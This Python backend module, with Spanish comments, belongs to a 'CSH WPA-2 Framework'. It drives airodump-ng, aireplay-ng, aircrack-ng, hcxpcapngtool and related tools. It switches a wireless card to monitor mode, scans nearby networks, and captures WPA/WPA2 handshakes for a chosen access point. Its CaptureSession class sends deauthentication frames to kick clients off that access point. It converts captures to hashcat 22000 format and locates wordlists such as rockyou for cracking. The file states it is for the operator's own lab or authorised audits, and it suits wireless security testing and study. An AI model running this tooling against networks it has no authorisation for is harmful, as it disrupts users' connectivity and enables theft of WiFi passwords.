"""
Backend del CSH WPA-2 Framework.

Envuelve la cadena de herramientas clásica (airodump-ng / aireplay-ng /
aircrack-ng / airmon-ng / hcxpcapngtool / hashcat / crunch) y expone datos
limpios a la interfaz Textual.  No imprime nada: solo devuelve datos o lanza
procesos. La capa visual vive en app.py.

Uso exclusivo en laboratorio propio o con autorización explícita.
"""

from __future__ import annotations

import os
import re
import shutil
import signal
import subprocess
import tempfile
import time
from dataclasses import dataclass
from pathlib import Path

# ── rutas del proyecto ───────────────────────────────────────────────────────
ROOT = Path(__file__).resolve().parent.parent
CAPTURE_DIR = ROOT / "captures"
REPORT_DIR = ROOT / "reports"
WORDLIST_DIR = ROOT / "wordlists"
HASH_DIR = ROOT / "hashes"
LOGO = ROOT / "CSH_Logo.png"

for _d in (CAPTURE_DIR, REPORT_DIR, WORDLIST_DIR, HASH_DIR):
    _d.mkdir(exist_ok=True)

MAC_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")


# ── capacidades del sistema ──────────────────────────────────────────────────
def have(cmd: str) -> bool:
    return shutil.which(cmd) is not None


def capabilities() -> dict[str, bool]:
    return {
        "airodump-ng": have("airodump-ng"),
        "aireplay-ng": have("aireplay-ng"),
        "aircrack-ng": have("aircrack-ng"),
        "tshark": have("tshark"),
        "hcxpcapngtool": have("hcxpcapngtool"),
        "hashcat": have("hashcat"),
        "crunch": have("crunch"),
    }


def is_root() -> bool:
    return os.geteuid() == 0


# ── modelo de datos ──────────────────────────────────────────────────────────
@dataclass
class Network:
    bssid: str
    channel: str = "?"
    power: int = -100
    privacy: str = ""
    cipher: str = ""
    auth: str = ""
    beacons: str = "0"
    essid: str = "<hidden>"
    clients: int = 0
    first_seen: str = ""
    last_seen: str = ""

    @property
    def hidden(self) -> bool:
        return not self.essid or self.essid == "<hidden>"

    @property
    def encryption(self) -> str:
        blob = f"{self.privacy} {self.auth}".upper()
        if "WPA3" in blob or "SAE" in blob:
            return "WPA3"
        if "WPA2" in blob:
            return "WPA2"
        if "WPA" in blob:
            return "WPA"
        if "WEP" in blob:
            return "WEP"
        if "OPN" in blob or "OPEN" in blob:
            return "OPN"
        return "?"

    @property
    def is_enterprise(self) -> bool:
        return "MGT" in f"{self.auth}".upper() or "EAP" in f"{self.auth}".upper()

    @property
    def crackable(self) -> bool:
        """Objetivo clásico de laboratorio: WPA/WPA2-PSK."""
        return self.encryption in ("WPA", "WPA2") and not self.is_enterprise


@dataclass
class Client:
    mac: str
    power: str = "0"
    packets: str = "0"
    bssid: str = ""
    probed: str = ""


# ── interfaces de red ────────────────────────────────────────────────────────
def _iw_info(iface: str) -> str:
    try:
        return subprocess.run(
            ["iw", "dev", iface, "info"],
            capture_output=True, text=True, timeout=5
        ).stdout
    except Exception:
        return ""


def iface_field(iface: str, key: str) -> str:
    for line in _iw_info(iface).splitlines():
        line = line.strip()
        if line.startswith(key):
            parts = line.split()
            if key == "channel":
                return parts[1] if len(parts) > 1 else "N/A"
            if key == "txpower":
                return " ".join(parts[1:3]) if len(parts) > 2 else "N/A"
            return parts[1] if len(parts) > 1 else "N/A"
    return "N/A"


def iface_type(iface: str) -> str:
    return iface_field(iface, "type")


def iface_channel(iface: str) -> str:
    return iface_field(iface, "channel")


def iface_mac(iface: str) -> str:
    return iface_field(iface, "addr")


def iface_bus(iface: str) -> str:
    """Bus físico de la interfaz: 'usb' (antena externa), 'pci' (NIC interna) u 'other'."""
    try:
        sub = os.path.realpath(f"/sys/class/net/{iface}/device/subsystem")
        return os.path.basename(sub).lower()
    except Exception:
        return "other"


# ── adaptadores WiFi USB sin driver (detección por chipset, estilo wifite3) ────
# Muchos adaptadores de pentest no exponen interfaz en `iw dev` hasta que su
# driver está cargado. wifite3 los reconoce por su chip USB (vid:pid); aquí
# hacemos lo mismo para poder avisar "hardware detectado, falta cargar driver".
_USB_WIFI_CHIPS: dict[str, str] = {
    "0e8d:7612": "MT7612U", "0e8d:7610": "MT7610U", "0e8d:7601": "MT7601U",
    "148f:7601": "MT7601U", "148f:5370": "RT5370", "148f:5372": "RT5372",
    "148f:3070": "RT3070", "148f:3072": "RT3072",
    "0bda:8812": "RTL8812AU", "0bda:881a": "RTL8812AU", "0bda:a618": "RTL8812AU",
    "0bda:8813": "RTL8813AU", "0bda:b812": "RTL8822BU", "0bda:c811": "RTL8811CU",
    "0bda:8811": "RTL8811AU", "0bda:8178": "RTL8192CU", "0bda:8176": "RTL8188CUS",
    "0bda:818b": "RTL8192EU", "0bda:f179": "RTL8188FTV", "0bda:8187": "RTL8187",
    "0cf3:9271": "AR9271", "0cf3:7015": "AR7010",
    "2357:0109": "RTL8812AU", "2357:0101": "RTL8812AU",
    "0846:9052": "RTL8812AU", "2001:3319": "RTL8812AU",
}

# Chip -> módulo del kernel que lo activa (para sugerir el modprobe correcto).
_CHIP_MODULE: dict[str, str] = {
    "MT7612U": "mt76x2u", "MT7610U": "mt76x0u", "MT7601U": "mt7601u",
    "RT5370": "rt2800usb", "RT5372": "rt2800usb", "RT3070": "rt2800usb",
    "RT3072": "rt2800usb", "RTL8812AU": "8812au", "RTL8813AU": "8812au",
    "RTL8811AU": "8812au", "RTL8822BU": "88x2bu", "RTL8811CU": "8821cu",
    "RTL8192CU": "rtl8192cu", "RTL8188CUS": "rtl8192cu", "RTL8192EU": "rtl8xxxu",
    "RTL8188FTV": "rtl8xxxu", "RTL8187": "rtl8187", "AR9271": "ath9k_htc",
    "AR7010": "ath9k_htc",
}


def chip_module(chip: str) -> str:
    """Módulo del kernel que da soporte a un chip, o '' si no se conoce."""
    return _CHIP_MODULE.get(chip, "")


def _read_sysfs(path: str) -> str:
    try:
        with open(path) as f:
            return f.read().strip()
    except Exception:
        return ""


def _usb_dev_has_netdev(devpath: str) -> tuple[bool, str]:
    """(driver_cargado, iface) para un dispositivo USB de /sys/bus/usb/devices."""
    import glob
    nets = glob.glob(os.path.join(devpath, "*", "net", "*"))
    if nets:
        return True, os.path.basename(nets[0])
    # phy registrada aunque todavía no tenga nombre de netdev
    if os.path.isdir(os.path.join(devpath, "ieee80211")):
        return True, ""
    return False, ""


def list_usb_wifi_adapters(include_bound: bool = False) -> list[dict]:
    """Adaptadores WiFi USB conocidos presentes en el bus.

    Los detecta por chipset (vid:pid) aunque el kernel aún no haya cargado el
    driver y, por tanto, no exista interfaz en `iw dev` (como hace wifite3).
    include_bound=False (defecto) devuelve solo los que NO tienen driver
    cargado, es decir los que faltan por aparecer como interfaz de red.
    """
    import glob
    adapters: list[dict] = []
    for devpath in glob.glob("/sys/bus/usb/devices/*"):
        vid = _read_sysfs(os.path.join(devpath, "idVendor")).lower()
        pid = _read_sysfs(os.path.join(devpath, "idProduct")).lower()
        if not vid or not pid:
            continue
        chip = _USB_WIFI_CHIPS.get(f"{vid}:{pid}")
        if not chip:
            continue
        bound, iface = _usb_dev_has_netdev(devpath)
        if bound and not include_bound:
            continue
        adapters.append({
            "chip": chip,
            "usb_id": f"{vid}:{pid}",
            "product": _read_sysfs(os.path.join(devpath, "product")),
            "manufacturer": _read_sysfs(os.path.join(devpath, "manufacturer")),
            "module": chip_module(chip),
            "driver_loaded": bound,
            "iface": iface,
        })
    return adapters


def iface_is_external(iface: str) -> bool:
    """True si la interfaz es una antena externa (adaptador USB)."""
    return iface_bus(iface) == "usb"


def list_interfaces(external_only: bool = False) -> list[dict]:
    """Devuelve interfaces WiFi (excluye P2P).

    external_only=True descarta la NIC interna (PCI) y deja solo
    antenas externas USB (p. ej. MT7612U).
    """
    out = []
    try:
        raw = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5).stdout
    except Exception:
        return out

    def _flush(iface, typ, addr, chan, phy):
        if not iface or typ == "P2P-device":
            return
        bus = iface_bus(iface)
        if external_only and bus != "usb":
            return
        out.append({"phy": phy, "iface": iface, "type": typ or "N/A",
                    "mac": addr or "N/A", "channel": chan or "N/A",
                    "bus": bus, "external": bus == "usb"})

    phy = iface = typ = addr = chan = None
    for line in raw.splitlines():
        s = line.strip()
        if line.startswith("phy#"):
            # Nueva phy: cierra la interfaz anterior (aún pertenece a la phy
            # vigente) antes de cambiar de contexto.
            _flush(iface, typ, addr, chan, phy)
            phy = s
            iface = typ = addr = chan = None
        elif s.startswith("Interface"):
            _flush(iface, typ, addr, chan, phy)
            iface = s.split()[1]
            typ = addr = chan = None
        elif s.startswith("Unnamed/non-netdev"):
            # Bloque sin netdev (p. ej. P2P-device): cierra la interfaz previa
            # y descarta su contexto para que sus 'addr'/'type' no la pisen.
            _flush(iface, typ, addr, chan, phy)
            iface = typ = addr = chan = None
        elif s.startswith("addr"):
            addr = s.split()[1]
        elif s.startswith("type"):
            typ = s.split()[1]
        elif s.startswith("channel"):
            chan = s.split()[1]
    _flush(iface, typ, addr, chan, phy)
    return out


def _iface_phy(iface: str, snapshot: list[dict] | None = None) -> str | None:
    """phy a la que pertenece `iface`, buscando en un snapshot de list_interfaces()."""
    for i in (snapshot if snapshot is not None else list_interfaces()):
        if i["iface"] == iface:
            return i["phy"]
    return None


def select_monitor_interface(before: set[str], after: list[dict], target: str) -> str | None:
    """Selecciona la interfaz monitor que pertenece a `target` y NADA MÁS.

    Función PURA (sin subprocess) para poder testearla aisladamente.

    `before` es un conjunto de nombres de interfaz previos a activar monitor.
    `after` es la lista actual de list_interfaces() (cada dict con las claves
    iface, type, phy, bus, mac, channel, external). `target` es la interfaz que
    el usuario eligió.

    Reglas, por prioridad:
      (a) si `target` ahora es type=="monitor", devolver `target`;
      (b) una interfaz NUEVA (en `after` pero no en `before`) cuyo nombre derive
          de target — nombre == target+"mon", o empiece por target, o comparta la
          phy de target — y type=="monitor";
      (c) una interfaz monitor cuya phy coincida con la de target.
    NUNCA devuelve una interfaz monitor ajena a target (otra phy Y nombre no
    relacionado). Devuelve None si nada coincide.
    """
    # phy de target: solo se conoce si target sigue presente en `after`.
    target_phy = _iface_phy(target, after)

    # (a) la propia target quedó en monitor.
    for i in after:
        if i["iface"] == target and i["type"] == "monitor":
            return target

    def _name_derives(name: str) -> bool:
        return name == f"{target}mon" or name.startswith(target)

    # (b) interfaz NUEVA (no estaba antes) derivada de target y en monitor.
    for i in after:
        if i["type"] != "monitor" or i["iface"] in before:
            continue
        same_phy = target_phy is not None and i["phy"] == target_phy
        if _name_derives(i["iface"]) or same_phy:
            return i["iface"]

    # (c) cualquier monitor en la MISMA phy que target.
    if target_phy is not None:
        for i in after:
            if i["type"] == "monitor" and i["phy"] == target_phy:
                return i["iface"]

    return None


def _stop_interfering(iface: str, log: list[str]) -> None:
    """Deja de interferir SOLO con `iface`, sin matar NetworkManager global.

    Evita `airmon-ng check kill` (que tumba NetworkManager/wpa_supplicant para
    TODAS las interfaces, incluida la NIC interna). En su lugar pide a
    NetworkManager que no gestione únicamente ESTA interfaz.
    """
    if have("nmcli"):
        subprocess.run(["nmcli", "device", "set", iface, "managed", "no"],
                       capture_output=True, text=True)
        log.append(f"nmcli device set {iface} managed no")


def enable_monitor(iface: str) -> tuple[bool, str, str]:
    """Activa modo monitor SOLO en `iface`. Devuelve (ok, nueva_iface, log)."""
    log: list[str] = []
    # phy de la interfaz objetivo ANTES de tocar nada: así el resultado no puede
    # "latch" a una interfaz monitor que pertenezca a otra antena/NIC.
    snapshot = list_interfaces()
    target_phy = _iface_phy(iface, snapshot)
    before = {i["iface"] for i in snapshot}

    # Parar SOLO lo que interfiere con ESTA interfaz (nunca check kill global).
    _stop_interfering(iface, log)

    # Ruta moderna basada en iw, acotada a `iface` (down -> monitor -> up).
    subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True)
    subprocess.run(["iw", "dev", iface, "set", "type", "monitor"], capture_output=True)
    subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True)
    log.append(f"iw dev {iface} set type monitor (phy {target_phy})")
    time.sleep(1)

    mon = select_monitor_interface(before, list_interfaces(), iface)
    if mon:
        return True, mon, "\n".join(log)

    # Fallback: airmon-ng start <iface> (NUNCA 'check kill').
    if have("airmon-ng"):
        subprocess.run(["airmon-ng", "start", iface], capture_output=True, text=True)
        log.append(f"airmon-ng start {iface}")
        time.sleep(1)
        mon = select_monitor_interface(before, list_interfaces(), iface)
        if mon:
            return True, mon, "\n".join(log)

    # Último recurso: comprobar si la propia iface quedó en monitor.
    if iface_type(iface) == "monitor":
        return True, iface, "\n".join(log)
    return False, iface, "\n".join(log)


def restore_managed(iface: str) -> tuple[bool, str, str]:
    """Devuelve a managed SOLO `iface` (o su vdev/phy derivado). No toca otras."""
    log: list[str] = []
    # phy objetivo para mapear de vuelta un vdev monitor renombrado por airmon-ng.
    target_phy = _iface_phy(iface)

    # Si hay un vdev monitor derivado (p. ej. wlan1mon), pararlo SOLO a él.
    if iface.endswith("mon") or iface_type(iface) == "monitor":
        if have("airmon-ng"):
            subprocess.run(["airmon-ng", "stop", iface], capture_output=True, text=True)
            log.append(f"airmon-ng stop {iface}")
            time.sleep(1)

    # netdev managed destino: la misma iface si sigue existiendo; si airmon-ng la
    # renombró/eliminó, el netdev que quede en la MISMA phy (jamás ifs[0] ciego).
    target = iface
    if not _iw_info(target):
        sibling = None
        for i in list_interfaces():
            if target_phy is not None and i["phy"] == target_phy:
                sibling = i["iface"]
                break
        target = sibling or iface

    subprocess.run(["ip", "link", "set", target, "down"], capture_output=True)
    subprocess.run(["iw", "dev", target, "set", "type", "managed"], capture_output=True)
    subprocess.run(["ip", "link", "set", target, "up"], capture_output=True)
    log.append(f"iw dev {target} set type managed")

    # Devolver la gestión a NetworkManager SOLO para esta interfaz (no se detuvo
    # NM globalmente, así que no hace falta reiniciarlo).
    if have("nmcli"):
        subprocess.run(["nmcli", "device", "set", target, "managed", "yes"],
                       capture_output=True, text=True)
        log.append(f"nmcli device set {target} managed yes")

    ok = iface_type(target) != "monitor"
    return ok, target, "\n".join(log)


def set_channel(iface: str, channel: str) -> None:
    subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True)
    subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)], capture_output=True)
    subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True)


def channel_to_freq(ch: str) -> str:
    try:
        c = int(ch)
    except (ValueError, TypeError):
        return "N/A"
    if 1 <= c <= 13:
        return f"{2407 + c * 5} MHz"
    if c == 14:
        return "2484 MHz"
    if c >= 32:
        return f"{5000 + c * 5} MHz"
    return "N/A"


# ── parseo de CSV de airodump ────────────────────────────────────────────────
def parse_airodump_csv(csv_path: str | Path) -> tuple[list[Network], dict[str, list[Client]]]:
    nets: dict[str, Network] = {}
    clients: dict[str, list[Client]] = {}
    try:
        text = Path(csv_path).read_text(errors="ignore")
    except Exception:
        return [], {}

    section = None
    for raw in text.splitlines():
        line = raw.strip()
        if not line:
            continue
        if line.startswith("BSSID") and "ESSID" in line:
            section = "ap"
            continue
        if line.startswith("Station MAC"):
            section = "sta"
            continue
        cols = [c.strip() for c in raw.split(",")]
        if section == "ap" and MAC_RE.match(cols[0]):
            try:
                power = int(cols[8]) if cols[8].lstrip("-").isdigit() else -100
            except (IndexError, ValueError):
                power = -100
            essid = cols[13] if len(cols) > 13 and cols[13] else "<hidden>"
            nets[cols[0]] = Network(
                bssid=cols[0],
                channel=cols[3] if len(cols) > 3 else "?",
                privacy=cols[5] if len(cols) > 5 else "",
                cipher=cols[6] if len(cols) > 6 else "",
                auth=cols[7] if len(cols) > 7 else "",
                power=power,
                beacons=cols[9] if len(cols) > 9 else "0",
                essid=essid,
            )
        elif section == "sta" and MAC_RE.match(cols[0]):
            bssid = cols[5] if len(cols) > 5 else ""
            cl = Client(
                mac=cols[0],
                power=cols[3] if len(cols) > 3 else "0",
                packets=cols[4] if len(cols) > 4 else "0",
                bssid=bssid,
                probed=cols[6] if len(cols) > 6 else "",
            )
            clients.setdefault(bssid, []).append(cl)

    for bssid, net in nets.items():
        net.clients = len(clients.get(bssid, []))
    return list(nets.values()), clients


# ── terminación robusta de procesos ──────────────────────────────────────────
def _kill_process_group(proc: subprocess.Popen) -> None:
    """Termina el proceso y su GRUPO: SIGTERM, espera breve y luego SIGKILL.

    airodump/aireplay pueden lanzar hijos; matar solo al padre deja huérfanos
    que bloquean la interfaz. Si el proceso se arrancó con start_new_session,
    tiene su propio grupo y os.killpg lo alcanza entero.
    """
    def _signal_group(sig: int) -> None:
        try:
            os.killpg(os.getpgid(proc.pid), sig)
        except Exception:
            try:
                proc.send_signal(sig)
            except Exception:
                pass

    _signal_group(signal.SIGTERM)
    try:
        proc.wait(timeout=3)
        return
    except Exception:
        pass
    _signal_group(signal.SIGKILL)
    try:
        proc.wait(timeout=2)
    except Exception:
        pass


# ── Scanner en vivo ──────────────────────────────────────────────────────────
class Scanner:
    """Lanza airodump-ng en segundo plano escribiendo CSV; se parsea por timer."""

    def __init__(self, interface: str):
        self.interface = interface
        self.proc: subprocess.Popen | None = None
        self.tmpdir: str | None = None
        self.prefix: str | None = None
        self.demo: bool = False
        self.demo_csv: Path | None = None

    @property
    def csv_path(self) -> Path | None:
        if self.demo:
            return self.demo_csv
        if self.prefix:
            return Path(f"{self.prefix}-01.csv")
        return None

    def start(self) -> None:
        self.tmpdir = tempfile.mkdtemp(prefix="csh_scan_")
        self.prefix = os.path.join(self.tmpdir, "scan")
        # start_new_session=True -> el proceso queda en su propio grupo/sesión,
        # de modo que al parar podemos matar al GRUPO (airodump lanza hijos).
        self.proc = subprocess.Popen(
            ["airodump-ng", "--write", self.prefix, "--output-format", "csv",
             "--write-interval", "1", self.interface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            start_new_session=True,
        )

    def start_demo(self) -> None:
        """Modo demo: agrega TODOS los CSV de captures/ para poblar la UI."""
        self.demo = True
        csvs = sorted(CAPTURE_DIR.glob("*-01.csv"), key=lambda p: p.stat().st_mtime, reverse=True)
        self.demo_csv = csvs[0] if csvs else None

    def poll(self) -> tuple[list[Network], dict[str, list[Client]]]:
        if self.demo:
            merged: dict[str, Network] = {}
            all_clients: dict[str, list[Client]] = {}
            for csv in sorted(CAPTURE_DIR.glob("*-01.csv")):
                nets, clients = parse_airodump_csv(csv)
                for n in nets:
                    cur = merged.get(n.bssid)
                    if cur is None or n.power > cur.power:
                        merged[n.bssid] = n
                for b, cl in clients.items():
                    all_clients.setdefault(b, []).extend(cl)
            for b, n in merged.items():
                n.clients = len({c.mac for c in all_clients.get(b, [])})
            return list(merged.values()), all_clients
        if self.csv_path and self.csv_path.exists():
            return parse_airodump_csv(self.csv_path)
        return [], {}

    def stop(self) -> None:
        proc = self.proc
        if proc and proc.poll() is None:
            _kill_process_group(proc)
        self.proc = None
        if self.tmpdir and os.path.isdir(self.tmpdir):
            shutil.rmtree(self.tmpdir, ignore_errors=True)
            self.tmpdir = None


# ── captura de handshake ─────────────────────────────────────────────────────
def safe_name(raw: str) -> str:
    raw = (raw or "unknown").replace("<hidden>", "hidden")
    raw = re.sub(r"[^A-Za-z0-9._-]+", "_", raw).strip("_")
    return raw or "unknown"


def has_handshake(cap: str | Path, bssid: str) -> bool:
    if not Path(cap).exists() or not bssid:
        return False
    try:
        out = subprocess.run(
            ["aircrack-ng", "-a2", "-b", bssid, str(cap)],
            capture_output=True, text=True, timeout=30,
        ).stdout
    except Exception:
        return False
    return bool(re.search(r"WPA \(\d+ handshake", out)) or "1 handshake" in out


def filter_pcap(raw_cap: str, bssid: str, out_cap: str) -> bool:
    if not have("tshark") or not Path(raw_cap).exists():
        return False
    subprocess.run(
        ["tshark", "-r", raw_cap, "-Y", f"wlan.addr == {bssid}", "-w", out_cap],
        capture_output=True,
    )
    return Path(out_cap).exists()


class CaptureSession:
    """Captura airodump limitada a un BSSID, con deauth opcional, no bloqueante."""

    def __init__(self, interface: str, net: Network):
        self.interface = interface
        self.net = net
        self.proc: subprocess.Popen | None = None
        self.deauth_proc: subprocess.Popen | None = None
        ts = time.strftime("%Y%m%d_%H%M%S")
        base = f"{safe_name(net.essid)}_{net.bssid.replace(':', '')}_ch{net.channel}_{ts}"
        self.prefix = str(CAPTURE_DIR / base)
        self.cap = f"{self.prefix}-01.cap"
        self.filtered = f"{self.prefix}_TARGET_ONLY.cap"
        self.started = 0.0

    def start(self) -> None:
        set_channel(self.interface, self.net.channel)
        self.proc = subprocess.Popen(
            ["airodump-ng", "--bssid", self.net.bssid, "-c", str(self.net.channel),
             "--write", self.prefix, "--output-format", "cap,csv", self.interface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        self.started = time.time()

    def deauth(self, count: int = 5, client: str | None = None) -> None:
        cmd = ["aireplay-ng", "--deauth", str(count), "-a", self.net.bssid]
        if client:
            cmd += ["-c", client]
        cmd.append(self.interface)
        self.deauth_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    @property
    def elapsed(self) -> int:
        return int(time.time() - self.started) if self.started else 0

    def captured(self) -> bool:
        return Path(self.cap).exists() and has_handshake(self.cap, self.net.bssid)

    def finalize(self) -> str | None:
        if Path(self.cap).exists():
            filter_pcap(self.cap, self.net.bssid, self.filtered)
            return self.cap
        return None

    def stop(self) -> None:
        for p in (self.deauth_proc, self.proc):
            if p and p.poll() is None:
                p.send_signal(signal.SIGTERM)
                try:
                    p.wait(timeout=3)
                except Exception:
                    p.kill()
        self.proc = self.deauth_proc = None


# ── diccionarios ─────────────────────────────────────────────────────────────
def discover_wordlists() -> list[Path]:
    found: list[Path] = []
    for c in ("/usr/share/wordlists/rockyou.txt",
              "/usr/share/wordlists/rockyou.txt.gz",
              "/usr/share/wordlists/fasttrack.txt",
              "/usr/share/dict/words"):
        p = Path(c)
        if p.exists():
            found.append(p)
    for pat in ("*.txt", "*.lst", "*.dict"):
        found.extend(sorted(WORDLIST_DIR.glob(pat)))
    # únicos preservando orden
    seen, uniq = set(), []
    for p in found:
        if p not in seen:
            seen.add(p)
            uniq.append(p)
    return uniq


def wordlist_lines(p: Path) -> str:
    try:
        if p.suffix == ".gz":
            return "comprimido"
        with p.open("rb") as fh:
            return f"{sum(1 for _ in fh):,}"
    except Exception:
        return "?"


# ── hashcat / 22000 ──────────────────────────────────────────────────────────
def convert_22000(cap: str, out: str) -> bool:
    if not have("hcxpcapngtool"):
        return False
    subprocess.run(["hcxpcapngtool", "-o", out, cap], capture_output=True)
    return Path(out).exists() and Path(out).stat().st_size > 0


# ── reportes ─────────────────────────────────────────────────────────────────
def write_reports(net: Network, status: str, cap: str,
                  filtered: str, hash22000: str = "") -> tuple[str, str]:
    base = f"{safe_name(net.essid)}_{net.bssid.replace(':', '')}_{time.strftime('%Y%m%d_%H%M%S')}"
    txt = REPORT_DIR / f"{base}.txt"
    md = REPORT_DIR / f"{base}.md"
    operator = os.environ.get("SUDO_USER") or os.environ.get("USER") or "root"

    txt.write_text(
        "CSH WPA-2 Framework Report\n==========================\n"
        f"Fecha: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"SSID: {net.essid}\nBSSID: {net.bssid}\nCanal: {net.channel}\n"
        f"Cifrado: {net.encryption}\nAuth: {net.auth}\n"
        f"Handshake: {status}\nCAP: {cap}\nFiltrado: {filtered}\n"
        f"Hash 22000: {hash22000 or 'N/A'}\n"
    )
    md.write_text(
        "# Reporte de auditoría WPA/WPA2 — CSH Framework\n\n"
        "> Uso exclusivo en laboratorio propio o con autorización explícita.\n\n"
        "| Campo | Valor |\n|---|---|\n"
        f"| Fecha | {time.strftime('%Y-%m-%d %H:%M:%S')} |\n"
        f"| Operador | {operator} |\n"
        f"| SSID | {net.essid} |\n| BSSID | {net.bssid} |\n"
        f"| Canal | {net.channel} |\n| Frecuencia | {channel_to_freq(net.channel)} |\n"
        f"| Cifrado | {net.encryption} |\n| Auth | {net.auth} |\n"
        f"| Potencia | {net.power} dBm |\n| Handshake | {status} |\n\n"
        "## Archivos\n\n"
        f"- CAP crudo: `{cap or 'N/A'}`\n- CAP filtrado: `{filtered or 'N/A'}`\n"
        f"- Hash 22000: `{hash22000 or 'N/A'}`\n\n"
        f"---\n_Generado por CSH WPA-2 Framework v2.0._\n"
    )
    return str(txt), str(md)


def artifacts() -> dict[str, list[Path]]:
    return {
        "captures": sorted(CAPTURE_DIR.glob("*.cap"), key=lambda p: p.stat().st_mtime, reverse=True),
        "reports": sorted(list(REPORT_DIR.glob("*.txt")) + list(REPORT_DIR.glob("*.md")),
                          key=lambda p: p.stat().st_mtime, reverse=True),
        "hashes": sorted(HASH_DIR.glob("*.22000"), key=lambda p: p.stat().st_mtime, reverse=True),
    }
